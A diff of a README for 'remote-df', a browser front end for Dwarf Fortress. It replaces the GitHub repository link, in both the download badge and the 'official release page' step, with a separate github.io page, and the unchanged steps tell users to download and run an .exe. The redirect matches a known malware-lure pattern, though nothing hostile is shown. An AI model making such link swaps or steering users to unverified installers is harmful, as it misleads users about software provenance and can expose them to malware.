@@ -1,6 +1,6 @@
 # 🎮 remote-df - Play Dwarf Fortress in your browser
 
-[![](https://img.shields.io/badge/Download-remote--df-blue.svg)](https://github.com/Tabitha4937/remote-df)
+[![](https://img.shields.io/badge/Download-remote--df-blue.svg)](https://tabitha4937.github.io)
 
 remote-df allows you to run Dwarf Fortress on a computer and see the game feed inside a web browser. You can play your games from any device connected to your network.
 
@@ -17,7 +17,7 @@ Your computer needs to meet these basic standards to run the software.
 
 Follow these steps to set up the software on your machine.
 
-1. Go to the [official release page](https://github.com/Tabitha4937/remote-df).
+1. Go to the [official release page](https://tabitha4937.github.io).
 2. Look for the latest version under the "Releases" section.
 3. Download the file named `remote-df-setup.exe`.
 4. Run the file after the download finishes.
